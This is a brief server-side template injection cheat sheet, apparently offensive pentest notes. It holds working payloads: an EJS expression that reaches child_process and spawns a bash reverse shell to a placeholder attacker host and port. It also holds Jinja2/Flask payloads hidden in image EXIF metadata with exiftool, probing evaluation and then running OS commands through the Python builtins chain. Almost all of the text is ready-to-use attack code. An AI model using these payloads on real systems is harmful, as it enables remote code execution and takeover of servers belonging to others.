# SSTI

EJS: confirm with `<%= guest %>` in any user-editable template preview, then break out to RCE via the constructor chain.

```bash
# confirm engine evaluates input
<%= guest %>

# EJS breakout -> process -> child_process spawn (reverse shell)
<%= this.constructor.constructor("return process")().mainModule.require("child_process").spawn("bash", ["-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"]) %>
```

Jinja2/Flask: any field that gets reflected back through a template render is worth probing — even unusual ones like EXIF metadata on an uploaded image, if the app shows a preview page that renders the image's own metadata:
```bash
exiftool -Artist='{{7*7}}' image.jpg        # upload/re-check preview -> 49 confirms the engine evaluates it
exiftool -Artist="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" image.jpg
```

